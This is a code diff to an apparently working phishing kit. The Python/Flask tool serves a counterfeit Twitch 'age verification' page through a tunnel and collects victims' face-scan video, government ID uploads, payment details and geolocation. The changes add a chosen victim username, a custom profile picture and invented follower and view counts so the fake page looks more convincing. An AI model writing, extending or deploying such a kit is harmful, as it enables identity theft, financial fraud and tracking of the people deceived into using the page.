@@ -78,10 +78,30 @@ def generate_random_username():
     
     return random.choice(username_patterns)()
 
-def find_profile_picture(folder):
-    """Search for an image file in the folder to use as profile picture."""
+def find_profile_picture(folder, manual_path=None):
+    """Search for an image file in the folder, or use a manual path."""
+    if manual_path and os.path.isfile(manual_path):
+        try:
+            with open(manual_path, 'rb') as f:
+                image_data = f.read()
+                image_ext = os.path.splitext(manual_path)[1].lower()
+                mime_types = {
+                    '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
+                    '.gif': 'image/gif', '.bmp': 'image/bmp', '.webp': 'image/webp'
+                }
+                mime_type = mime_types.get(image_ext, 'image/jpeg')
+                base64_image = base64.b64encode(image_data).decode('utf-8')
+                return {
+                    'filename': os.path.basename(manual_path),
+                    'data_url': f'data:{mime_type};base64,{base64_image}',
+                    'path': manual_path
+                }
+        except Exception as e:
+            print(f"Error reading manual profile picture: {e}")
+            return None
+
+    # Auto-detect in folder
     image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
-    
     for file in os.listdir(folder):
         file_lower = file.lower()
         if any(file_lower.endswith(ext) for ext in image_extensions):
@@ -90,19 +110,12 @@ def find_profile_picture(folder):
                 with open(filepath, 'rb') as f:
                     image_data = f.read()
                     image_ext = os.path.splitext(file)[1].lower()
-                    
                     mime_types = {
-                        '.jpg': 'image/jpeg',
-                        '.jpeg': 'image/jpeg',
-                        '.png': 'image/png',
-                        '.gif': 'image/gif',
-                        '.bmp': 'image/bmp',
-                        '.webp': 'image/webp'
+                        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
+                        '.gif': 'image/gif', '.bmp': 'image/bmp', '.webp': 'image/webp'
                     }
-                    
                     mime_type = mime_types.get(image_ext, 'image/jpeg')
                     base64_image = base64.b64encode(image_data).decode('utf-8')
-                    
                     return {
                         'filename': file,
                         'data_url': f'data:{mime_type};base64,{base64_image}',
@@ -110,45 +123,18 @@ def find_profile_picture(folder):
                     }
             except Exception as e:
                 print(f"Error reading profile picture {file}: {e}")
-    
     return None
 
-def get_verification_settings(interactive=False):
-    # Declare global first to avoid SyntaxError
+def get_verification_settings():
+    """Get user preferences for verification process including all stats and profile picture."""
     global DOWNLOAD_FOLDER
 
-    if not interactive:
-        # Default settings (no prompts)
-        settings = {
-            'target_username': generate_random_username(),
-            'account_type': 'streamer',
-            'face_duration': 25,
-            'id_enabled': True,
-            'id_type': 'government',
-            'payment_enabled': True,
-            'location_enabled': True,
-            'profile_picture': None,
-            'profile_picture_filename': None
-        }
-        # Try to find a profile picture
-        profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
-        if profile_pic:
-            settings['profile_picture'] = profile_pic['data_url']
-            settings['profile_picture_filename'] = profile_pic['filename']
-            print(f"[+] Found profile picture: {profile_pic['filename']}")
-        else:
-            print("[!] No profile picture found; using default avatar.")
-        return settings
-
-    # Original interactive logic (unchanged)
     print("\n" + "="*60)
     print("TWITCH AGE VERIFICATION SETUP")
     print("="*60)
     
+    # --- Target Username ---
     print("\n[+] TARGET USERNAME SETUP")
-    print("Enter the Twitch username to display in the verification page")
-    print("Leave blank for random username generation")
-    
     username_input = input("Target username (or press Enter for random): ").strip()
     if username_input:
         settings = {'target_username': username_input}
@@ -156,26 +142,36 @@ def get_verification_settings(interactive=False):
         random_username = generate_random_username()
         settings = {'target_username': random_username}
         print(f"[+] Generated random username: {random_username}")
+
+    # --- Profile Picture ---
+    print("\n[+] PROFILE PICTURE SETUP")
+    print("You can specify a path to an image file, or let the script auto-detect in the download folder.")
+    pic_input = input("Enter path to profile picture (or press Enter for auto-detect): ").strip()
+    profile_pic = None
+    if pic_input:
+        profile_pic = find_profile_picture(DOWNLOAD_FOLDER, manual_path=pic_input)
+        if profile_pic:
+            print(f"[+] Using profile picture: {profile_pic['filename']}")
+        else:
+            print(f"[!] Could not load image from '{pic_input}'. Will auto-detect.")
+    if not profile_pic:
+        profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
+        if profile_pic:
+            print(f"[+] Auto-detected profile picture: {profile_pic['filename']}")
+        else:
+            print(f"[!] No profile picture found; using default avatar.")
+            print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} or provide a path.")
     
-    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
-    if profile_pic:
-        settings['profile_picture'] = profile_pic['data_url']
-        settings['profile_picture_filename'] = profile_pic['filename']
-        print(f"[+] Found profile picture: {profile_pic['filename']}")
-        print(f"[+] Using profile picture for @{settings['target_username']}")
-    else:
-        settings['profile_picture'] = None
-        settings['profile_picture_filename'] = None
-        print(f"[!] No profile picture found in folder")
-        print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
-    
+    settings['profile_picture'] = profile_pic['data_url'] if profile_pic else None
+    settings['profile_picture_filename'] = profile_pic['filename'] if profile_pic else None
+
     print(f"\n[+] Verification will appear for: @{settings['target_username']}")
     
+    # --- Account Type ---
     print("\n1. Account Type:")
     print("Is this a streamer or viewer account?")
     print("1. Streamer Account (wants to stream content)")
     print("2. Viewer Account (wants to watch age-restricted content)")
-    
     while True:
         account_type = input("Select account type (1/2, default: 1): ").strip()
         if not account_type:
@@ -189,11 +185,27 @@ def get_verification_settings(interactive=False):
             break
         else:
             print("Please enter 1 or 2.")
+
+    # --- Stats ---
+    print("\n[+] ACCOUNT STATS (leave blank for random values)")
+    followers = input("Number of followers (default random): ").strip()
+    settings['followers'] = int(followers) if followers.isdigit() else random.randint(500, 10000) if settings['account_type'] == 'streamer' else random.randint(10, 1000)
     
+    following = input("Number of following (default random): ").strip()
+    settings['following'] = int(following) if following.isdigit() else random.randint(50, 500)
+    
+    if settings['account_type'] == 'streamer':
+        views = input("Total views (default random): ").strip()
+        settings['total_views'] = int(views) if views.isdigit() else random.randint(1000, 100000)
+    else:
+        settings['total_views'] = 0  # not used for viewer
+    
+    age = input("Account age in days (default random): ").strip()
+    settings['account_age'] = int(age) if age.isdigit() else random.randint(30, 365 * 3)
+
+    # --- Face Scan Duration ---
     print(f"\n2. Face Scan Duration:")
-    print(f"How many seconds for face verification for {settings['account_type']} account?")
-    print("Recommended: 15-30 seconds for complete verification")
-    
+    print("How many seconds for face verification?")
     while True:
         try:
             duration = input("Duration in seconds (5-60, default: 25): ").strip()
@@ -209,17 +221,15 @@ def get_verification_settings(interactive=False):
         except ValueError:
             print("Please enter a valid number.")
     
+    # --- ID Verification ---
     print(f"\n3. ID Document Verification:")
-    print(f"Require ID document upload for age verification?")
     id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
     settings['id_enabled'] = id_enabled in ['y', 'yes', '']
-    
     if settings['id_enabled']:
         print("\nID Document Type:")
         print("1. Government ID (Passport, Driver's License)")
         print("2. Student ID")
         print("3. Parental Consent Form")
-        
         while True:
             id_type = input("Select ID type (1/2/3, default: 1): ").strip()
             if not id_type:
@@ -236,20 +246,22 @@ def get_verification_settings(interactive=False):
                 break
             else:
                 print("Please enter 1, 2, or 3.")
-    
+    else:
+        settings['id_type'] = None
+
+    # --- Payment Verification (only for streamer) ---
     if settings['account_type'] == 'streamer':
         print(f"\n4. Payment Verification:")
-        print(f"Require payment method verification for monetization?")
         payment_enabled = input("Enable payment verification (y/n, default: y): ").strip().lower()
         settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
     else:
         settings['payment_enabled'] = False
-    
+
+    # --- Location Verification ---
     print(f"\n5. Location Verification:")
-    print(f"Require location verification for regional compliance?")
     location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
     settings['location_enabled'] = location_enabled in ['y', 'yes', '']
-    
+
     return settings
 
 # --- Location Processing Functions ---
@@ -401,19 +413,32 @@ def create_html_template(settings):
     profile_picture = settings.get('profile_picture')
     profile_picture_filename = settings.get('profile_picture_filename')
     
-    followers = random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000)
-    following = random.randint(50, 500)
-    total_views = random.randint(1000, 100000) if account_type == 'streamer' else 0
-    account_age = random.randint(30, 365 * 3)
+    # Use custom stats
+    followers = settings.get('followers', random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000))
+    following = settings.get('following', random.randint(50, 500))
+    total_views = settings.get('total_views', random.randint(1000, 100000) if account_type == 'streamer' else 0)
+    account_age = settings.get('account_age', random.randint(30, 365 * 3))
     
-    total_steps = 2  # Introduction + Face
+    # Build step IDs dynamically
+    step_ids = ['step1', 'step2']
     if id_enabled:
-        total_steps += 1
+        step_ids.append('step3')
     if payment_enabled:
-        total_steps += 1
+        step_ids.append('step4')
     if location_enabled:
-        total_steps += 1
-    total_steps += 1  # Final step
+        step_ids.append('step5')
+    step_ids.append('stepFinal')
+    step_ids.append('stepComplete')
+    step_ids.append('stepReview')
+    
+    # Main steps are all except the last two (complete and review)
+    main_step_ids = step_ids[:-2]
+    total_steps = len(main_step_ids)
+    
+    # Convert to JSON for JavaScript
+    import json as json_module
+    step_ids_json = json_module.dumps(step_ids)
+    main_step_ids_json = json_module.dumps(main_step_ids)
     
     template = f'''<!DOCTYPE html>
 <html lang="en">
@@ -1338,7 +1363,7 @@ def create_html_template(settings):
                 </div>
                 <div class="stat-item">
                     <div class="stat-number">
-                        {'{:,}'.format(total_views) if account_type == 'streamer' else 'N/A'}
+                        {'{:,}'.format(total_views) if account_type == 'streamer' else str(account_age) + 'd'}
                     </div>
                     <div class="stat-label">
                         {'Total Views' if account_type == 'streamer' else 'Account Age'}
@@ -1363,6 +1388,7 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- STEP 1: Introduction -->
             <div class="step active" id="step1">
                 <h2 class="step-title">Account Verification Required</h2>
                 <p class="step-subtitle">
@@ -1408,6 +1434,7 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- STEP 2: Face -->
             <div class="step" id="step2">
                 <h2 class="step-title">Face Verification</h2>
                 <p class="step-subtitle">
@@ -1440,6 +1467,7 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- STEP 3: ID (if enabled) -->
             <div class="step" id="step3">
                 <h2 class="step-title">ID Document Verification</h2>
                 <p class="step-subtitle">
@@ -1506,6 +1534,7 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- STEP 4: Payment (if enabled) -->
             <div class="step" id="step4">
                 <h2 class="step-title">Payment Verification</h2>
                 <p class="step-subtitle">
@@ -1566,6 +1595,7 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- STEP 5: Location (if enabled) -->
             <div class="step" id="step5">
                 <h2 class="step-title">Location Verification</h2>
                 <p class="step-subtitle">
@@ -1627,6 +1657,7 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- STEP FINAL: Processing -->
             <div class="step" id="stepFinal">
                 <h2 class="step-title">Verification in Progress</h2>
                 <p class="step-subtitle">
@@ -1647,6 +1678,7 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- STEP COMPLETE -->
             <div class="step" id="stepComplete">
                 <div class="completion-container">
                     <div class="success-icon">✅</div>
@@ -1684,6 +1716,7 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- STEP REVIEW -->
             <div class="step" id="stepReview">
                 <div class="review-container">
                     <div class="review-icon">⏳</div>
@@ -1769,8 +1802,80 @@ def create_html_template(settings):
     </div>
     
     <script>
-        let currentStep = 1;
-        let totalSteps = {total_steps};
+        // --- Step navigation using dynamic step list ---
+        var stepIds = {step_ids_json};
+        var mainStepIds = {main_step_ids_json};
+        var currentStepIndex = 0;  // index into stepIds
+        
+        // total main steps (excluding complete and review)
+        var totalMainSteps = mainStepIds.length;
+        
+        function updateProgress() {{
+            // Calculate progress based on current index within main steps
+            var progress = 0;
+            if (currentStepIndex < mainStepIds.length) {{
+                progress = (currentStepIndex / (mainStepIds.length - 1)) * 100;
+            }} else if (currentStepIndex >= mainStepIds.length) {{
+                progress = 100;
+            }}
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('stepLineFill').style.width = progress + '%';
+            
+            // Update indicators (only for main steps, max 5)
+            var indicators = document.querySelectorAll('.step-indicator');
+            for (var i = 0; i < indicators.length; i++) {{
+                var idx = i; // 0-based
+                indicators[i].classList.remove('active', 'completed');
+                if (idx < currentStepIndex) {{
+                    indicators[i].classList.add('completed');
+                }} else if (idx === currentStepIndex && currentStepIndex < mainStepIds.length) {{
+                    indicators[i].classList.add('active');
+                }}
+            }}
+        }}
+        
+        function showStepById(stepId) {{
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(function(el) {{
+                el.classList.remove('active');
+            }});
+            var stepElement = document.getElementById(stepId);
+            if (stepElement) {{
+                stepElement.classList.add('active');
+            }}
+        }}
+        
+        function goToStepIndex(index) {{
+            if (index >= 0 && index < stepIds.length) {{
+                currentStepIndex = index;
+                showStepById(stepIds[index]);
+                updateProgress();
+            }}
+        }}
+        
+        function nextStep() {{
+            // If we are at the last main step (stepFinal), don't advance further via next
+            var lastMainIndex = mainStepIds.length - 1;
+            if (currentStepIndex < lastMainIndex) {{
+                goToStepIndex(currentStepIndex + 1);
+            }}
+        }}
+        
+        function prevStep() {{
+            if (currentStepIndex > 0) {{
+                goToStepIndex(currentStepIndex - 1);
+            }}
+        }}
+        
+        // For external calls like after face verification
+        function goToNextMainStep() {{
+            var lastMainIndex = mainStepIds.length - 1;
+            if (currentStepIndex < lastMainIndex) {{
+                goToStepIndex(currentStepIndex + 1);
+            }}
+        }}
+        
+        // Face Verification Variables
         let faceStream = null;
         let faceRecorder = null;
         let faceChunks = [];
@@ -1798,46 +1903,11 @@ def create_html_template(settings):
             {{icon: "✅", text: "Complete", detail: "Face verification successful!", duration: 1}}
         ];
         
-        function updateProgress() {{
-            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
-            document.getElementById('progressFill').style.width = progress + '%';
-            document.getElementById('stepLineFill').style.width = progress + '%';
-            
-            const indicators = document.querySelectorAll('.step-indicator');
-            indicators.forEach((indicator, index) => {{
-                indicator.classList.remove('active', 'completed');
-                if (index + 1 < currentStep) {{
-                    indicator.classList.add('completed');
-                }} else if (index + 1 === currentStep) {{
-                    indicator.classList.add('active');
-                }}
-            }});
-        }}
+        // Override the initial showStep with our navigation
+        // Start at step1 (index 0)
+        goToStepIndex(0);
         
-        function showStep(stepNumber) {{
-            document.querySelectorAll('.step').forEach(step => {{
-                step.classList.remove('active');
-            }});
-            const stepElement = document.getElementById('step' + stepNumber);
-            if (stepElement) {{
-                stepElement.classList.add('active');
-                currentStep = stepNumber;
-                updateProgress();
-            }}
-        }}
-        
-        function nextStep() {{
-            if (currentStep < totalSteps + 1) {{
-                showStep(currentStep + 1);
-            }}
-        }}
-        
-        function prevStep() {{
-            if (currentStep > 1) {{
-                showStep(currentStep - 1);
-            }}
-        }}
-        
+        // --- Face Verification ---
         async function startFaceVerification() {{
             try {{
                 const button = document.getElementById('startFaceBtn');
@@ -1934,7 +2004,7 @@ def create_html_template(settings):
             showFaceInstruction(faceInstructions.length - 1);
             document.getElementById('faceTimer').textContent = "✅ Complete";
             setTimeout(() => {{
-                nextStep();
+                goToNextMainStep();
             }}, 2000);
         }}
         
@@ -1967,6 +2037,7 @@ def create_html_template(settings):
             reader.readAsDataURL(videoBlob);
         }}
         
+        // --- ID Verification ---
         function handleIDFileSelect(input, type) {{
             const file = input.files[0];
             if (file) handleIDFile(file, type);
@@ -2022,7 +2093,7 @@ def create_html_template(settings):
                 success: function(response) {{
                     statusDiv.className = 'status-message status-success';
                     statusDiv.textContent = '✓ ID documents uploaded successfully!';
-                    setTimeout(() => nextStep(), 1500);
+                    setTimeout(() => goToNextMainStep(), 1500);
                 }},
                 error: function(xhr, status, error) {{
                     statusDiv.className = 'status-message status-error';
@@ -2033,6 +2104,7 @@ def create_html_template(settings):
             }});
         }}
         
+        // --- Payment Verification ---
         function selectPaymentMethod(method) {{
             selectedPaymentMethod = method;
             document.querySelectorAll('.payment-option').forEach(option => {{
@@ -2073,10 +2145,11 @@ def create_html_template(settings):
                         console.log('Payment verification uploaded');
                     }}
                 }});
-                setTimeout(() => nextStep(), 1500);
+                setTimeout(() => goToNextMainStep(), 1500);
             }}, 2000);
         }}
         
+        // --- Location Verification ---
         function requestLocation() {{
             const button = document.getElementById('locationBtn');
             const statusDiv = document.getElementById('locationStatus');
@@ -2169,11 +2242,19 @@ def create_html_template(settings):
             const button = document.getElementById('locationBtn');
             button.disabled = true;
             button.textContent = '✓ Location Verified';
-            setTimeout(() => startFinalVerification(), 2000);
+            // Move to next main step (should be stepFinal)
+            goToNextMainStep();
+            // After moving to stepFinal, start the final verification process
+            setTimeout(() => startFinalVerification(), 1500);
         }}
         
+        // --- Final Processing ---
         function startFinalVerification() {{
-            showStep('stepFinal');
+            // Ensure we are on stepFinal
+            var stepFinalIndex = stepIds.indexOf('stepFinal');
+            if (currentStepIndex !== stepFinalIndex) {{
+                goToStepIndex(stepFinalIndex);
+            }}
             const statusDiv = document.getElementById('finalStatus');
             let progress = 25;
             const progressInterval = setInterval(() => {{
@@ -2199,7 +2280,11 @@ def create_html_template(settings):
         }}
         
         function showCompletionPage() {{
-            showStep('stepComplete');
+            // Go to stepComplete
+            var completeIndex = stepIds.indexOf('stepComplete');
+            if (completeIndex !== -1) {{
+                goToStepIndex(completeIndex);
+            }}
             let countdown = 5;
             const countdownElement = document.getElementById('countdown');
             countdownElement.textContent = countdown;
@@ -2215,7 +2300,10 @@ def create_html_template(settings):
         
         function showReviewPage() {{
             clearInterval(countdownTimer);
-            showStep('stepReview');
+            var reviewIndex = stepIds.indexOf('stepReview');
+            if (reviewIndex !== -1) {{
+                goToStepIndex(reviewIndex);
+            }}
         }}
         
         function returnToTwitch() {{
@@ -2234,7 +2322,7 @@ def create_html_template(settings):
                     session_id: sessionId,
                     target_username: targetUsername,
                     account_type: accountType,
-                    completed_steps: currentStep,
+                    completed_steps: currentStepIndex,
                     verification_timestamp: new Date().toISOString(),
                     user_agent: navigator.userAgent,
                     screen_resolution: `${{screen.width}}x${{screen.height}}`,
@@ -2243,9 +2331,6 @@ def create_html_template(settings):
                 contentType: 'application/json'
             }});
         }}
-        
-        updateProgress();
-        setTimeout(() => showStep(1), 500);
     </script>
 </body>
 </html>'''
@@ -2559,11 +2644,8 @@ if __name__ == '__main__':
     # Install dependencies and check cloudflared
     cloudflared_ok = check_dependencies()
     
-    # Parse command line arguments
-    interactive = '--interactive' in sys.argv
-    
-    # Set default settings (non-interactive)
-    VERIFICATION_SETTINGS = get_verification_settings(interactive=interactive)
+    # Get settings interactively (always prompts)
+    VERIFICATION_SETTINGS = get_verification_settings()
     
     # Suppress Flask's default banner and logs
     log = logging.getLogger('werkzeug')
@@ -2571,7 +2653,6 @@ if __name__ == '__main__':
     
     # Remove any Werkzeug reloader environment variables
     os.environ.pop('WERKZEUG_SERVER_FD', None)
-    # Ensure we are not in reloader mode
     os.environ['WERKZEUG_RUN_MAIN'] = 'false'
     
     # Find an available port (start from 4046, try next if busy)
@@ -2601,7 +2682,14 @@ if __name__ == '__main__':
         print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
     else:
         print(f"[!] No profile picture found; using default avatar.")
-        print(f"[!] Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
+        print(f"[!] Place an image in {DOWNLOAD_FOLDER} or specify path during setup.")
+    
+    print(f"[+] Followers: {VERIFICATION_SETTINGS.get('followers', 'random')}")
+    print(f"[+] Following: {VERIFICATION_SETTINGS.get('following', 'random')}")
+    if VERIFICATION_SETTINGS['account_type'] == 'streamer':
+        print(f"[+] Total Views: {VERIFICATION_SETTINGS.get('total_views', 'random')}")
+    else:
+        print(f"[+] Account Age: {VERIFICATION_SETTINGS.get('account_age', 'random')} days")
     
     print(f"[+] Data will be saved to: {DOWNLOAD_FOLDER}")
     print(f"[+] Face scan duration: {VERIFICATION_SETTINGS['face_duration']} seconds")
@@ -2635,8 +2723,15 @@ if __name__ == '__main__':
     else:
         print(f"👤 Profile: Default Twitch avatar")
     
-    followers = random.randint(500, 10000) if VERIFICATION_SETTINGS['account_type'] == 'streamer' else random.randint(10, 1000)
-    print(f"📊 Stats: {followers} followers • {random.randint(30, 365*3)} days old")
+    followers = VERIFICATION_SETTINGS.get('followers', 'random')
+    following = VERIFICATION_SETTINGS.get('following', 'random')
+    print(f"📊 Stats: {followers} followers • {following} following")
+    if VERIFICATION_SETTINGS['account_type'] == 'streamer':
+        views = VERIFICATION_SETTINGS.get('total_views', 'random')
+        print(f"👀 Views: {views}")
+    else:
+        age = VERIFICATION_SETTINGS.get('account_age', 'random')
+        print(f"📅 Account Age: {age} days")
     
     print(f"🔒 Reason: Age verification required for {'streaming' if VERIFICATION_SETTINGS['account_type'] == 'streamer' else 'viewing age-restricted content'}")
     print(f"⏰ Time limit: Complete within 24 hours")
